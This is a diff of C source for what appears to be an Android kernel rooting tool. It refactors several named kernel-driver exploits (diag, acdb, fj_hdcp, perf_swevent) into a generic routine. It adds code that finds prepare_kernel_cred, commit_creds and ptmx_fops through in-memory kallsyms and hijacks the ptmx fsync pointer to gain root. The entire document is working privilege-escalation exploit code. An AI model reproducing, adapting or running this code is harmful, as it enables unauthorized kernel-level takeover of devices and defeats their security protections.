@@ -14,10 +14,7 @@
 #include "cred.h"
 #include "mm.h"
 #include "ptmx.h"
-#include "libdiagexploit/diag.h"
-#include "libperf_event_exploit/perf_event.h"
-#include "libmsm_acdb_exploit/acdb.h"
-#include "libfj_hdcp_exploit/fj_hdcp.h"
+#include "exploit.h"
 
 void
 obtain_root_privilege(void)
@@ -39,79 +36,16 @@ run_obtain_root_privilege(void *user_data)
 }
 
 static bool
-attempt_diag_exploit(unsigned long int address)
-{
-  struct diag_values injection_data;
-
-  injection_data.address = address;
-  injection_data.value = (uint16_t)&obtain_root_privilege;
-
-  return diag_run_exploit(&injection_data, 1,
-                          run_obtain_root_privilege, NULL);
-}
-
-static bool
-attempt_acdb_exploit(unsigned long int address, unsigned long int original_value)
-{
-  if (acdb_run_exploit(address, (int)&obtain_root_privilege,
-                       run_obtain_root_privilege, NULL)) {
-
-    acdb_write_value_at_address(address, original_value);
-
-    return true;
-  }
-
-  return false;
-}
-
-static bool
-attempt_fj_hdcp_exploit(unsigned long int address, unsigned long int original_value)
-{
-  if (fj_hdcp_run_exploit(address, (int)&obtain_root_privilege,
-                          run_obtain_root_privilege, NULL)) {
-
-    fj_hdcp_write_value_at_address(address, original_value);
-
-    return true;
-  }
-
-  return false;
-}
-
-static bool
 run_exploit(void)
 {
-  unsigned long int ptmx_fsync_address;
-  unsigned long int ptmx_fops_address;
-
-  ptmx_fops_address = get_ptmx_fops_address();
-  if (!ptmx_fops_address) {
+  get_ptmx_fops_fsync_address();
+  if (!ptmx_fops_fsync_address) {
     return false;
   }
 
-  ptmx_fsync_address = ptmx_fops_address + 0x38;
-
-
-  printf("Attempt perf_swevent exploit...\n");
-  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
-                                  run_obtain_root_privilege, NULL)) {
-    return true;
-  }
-  printf("\n");
-
-  printf("Attempt acdb exploit...\n");
-  if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
-    return true;
-  }
-  printf("\n");
-
-  printf("Attempt fj_hdcp exploit...\n");
-  if (attempt_fj_hdcp_exploit(ptmx_fsync_address, 0)) {
-    return true;
-  }
-  printf("\n");
-
-  return attempt_diag_exploit(ptmx_fsync_address);
+  return attempt_exploit(ptmx_fops_fsync_address,
+                         (unsigned long int)&obtain_root_privilege, 0,
+                         run_obtain_root_privilege, NULL);
 }
 
 void
@@ -124,6 +58,102 @@ device_detected(void)
   __system_property_get("ro.build.display.id", build_id);
 
   printf("\n\nDevice detected: %s (%s)\n\n", device, build_id);
+}
+
+static bool
+find_ptmx_fops_address(void *mem, size_t length)
+{
+  find_ptmx_fops_hint_t hint;
+
+  hint.ptmx_open_address = kallsyms_in_memory_lookup_name("ptmx_open");
+  if (!hint.ptmx_open_address) {
+    return false;
+  }
+
+  hint.tty_release_address = kallsyms_in_memory_lookup_name("tty_release");
+  if (!hint.tty_release_address) {
+    return false;
+  }
+
+  hint.tty_fasync_address = kallsyms_in_memory_lookup_name("tty_fasync");
+  if (!hint.tty_fasync_address) {
+    return false;
+  }
+
+  return get_ptmx_fops_address_in_memory(mem, length, &hint);
+}
+
+bool find_variables_in_memory(void *mem, size_t length)
+{
+  printf("Search address in memroy...\n");
+
+  if (kallsyms_in_memory_init(mem, length)) {
+    printf("Using kallsyms_in_memroy...\n");
+
+    if (!prepare_kernel_cred) {
+      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
+    }
+
+    if (!commit_creds) {
+      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name("commit_creds");
+    }
+
+    if (!ptmx_fops) {
+      ptmx_fops = (void *)kallsyms_in_memory_lookup_name("ptmx_fops");
+
+      if (!ptmx_fops) {
+	find_ptmx_fops_address(mem, length);
+      }
+    }
+
+    if (prepare_kernel_cred && commit_creds && ptmx_fops) {
+      return true;
+    }
+  }
+
+  get_prepare_kernel_cred_address_in_memory(mem, length);
+  get_commit_creds_address_in_memory(mem, length);
+
+  return prepare_kernel_cred && commit_creds && ptmx_fops;
+}
+
+bool
+setup_variables(void)
+{
+  get_prepare_kernel_cred_address();
+  get_commit_creds_address();
+  get_ptmx_fops_address();
+
+  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
+    return true;
+  }
+
+  printf("Try to find address in memory...\n");
+  run_with_mmap(find_variables_in_memory);
+
+  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
+    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
+    printf("  commit_creds = %p\n", commit_creds);
+    printf("  ptmx_fops = %p\n", ptmx_fops);
+
+    return true;
+  }
+
+  if (!prepare_kernel_cred) {
+    printf("Failed to get prepare_kernel_cred addresses.\n");
+  }
+
+  if (!commit_creds) {
+    printf("Failed to get commit_creds addresses.\n");
+  }
+
+  if (!ptmx_fops) {
+    printf("Failed to get ptmx_fops addresses.\n");
+  }
+
+  print_reason_device_not_supported();
+
+  return false;
 }
 
 int
@@ -141,15 +171,8 @@ main(int argc, char **argv)
 
   device_detected();
 
-  set_kernel_phys_offset(0x200000);
-  remap_pfn_range = get_remap_pfn_range_address();
-  if (!remap_pfn_range) {
-    printf("You need to manage to get remap_pfn_range addresses.\n");
-    exit(EXIT_FAILURE);
-  }
-
-  if (!setup_creds_functions()) {
-    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
+  if (!setup_variables()) {
+    printf("Failed to setup variables.\n");
     exit(EXIT_FAILURE);
   }
 
